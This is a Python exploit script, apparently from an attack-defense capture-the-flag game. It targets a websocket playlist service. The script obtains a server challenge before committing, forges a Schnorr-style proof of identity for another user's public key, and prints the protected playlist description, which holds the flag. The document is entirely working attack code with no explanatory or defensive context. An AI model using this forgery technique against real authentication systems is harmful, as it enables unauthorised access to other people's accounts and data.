#!/usr/bin/env python3
import sys
from modules.client import *

async def exploit(ip, flag_id):
    client = Client(f'ws://{ip}:{port}/api')
    username, password = [random_string(20) for _ in range(2)]
    await client.register(username, password)

    request = {
            'action': 'INIT_GET_SHARED_PLAYLIST',
            'params': {
                'token': client.user.token,
                'comm': 1
            }
        }
    response = await client.send(request)

    request = {
            'action': 'FINISH_GET_SHARED_PLAYLIST',
            'params': {
                'token': client.user.token,
                'resp': 1,
                'playlist_id': flag_id
            }
        }
    response = await client.send(request)
    pubkey = response['pubkey']
    print(f'{pubkey = }')
    
    request = {
            'action': 'INIT_GET_SHARED_PLAYLIST',
            'params': {
                'token': client.user.token,
                'comm': 1
            }
        }
    response = await client.send(request)
    chall = response['chall']
    print(f'{chall = }')

    resp = rng.randrange(q)
    comm = (pow(g, resp, p) * pow(pubkey, -chall, p))%p
    request = {
            'action': 'INIT_GET_SHARED_PLAYLIST',
            'params': {
                'token': client.user.token,
                'comm': comm
            }
        }
    response = await client.send(request)
    request = {
            'action': 'FINISH_GET_SHARED_PLAYLIST',
            'params': {
                'token': client.user.token,
                'resp': resp,
                'playlist_id': flag_id
            }
        }
    response = await client.send(request)
    print(f'{response["description"] = }')
    return

if __name__ == "__main__":
    ip = sys.argv[1]
    port = 5000
    flag_id = sys.argv[2]
    asyncio.run(exploit(ip, flag_id))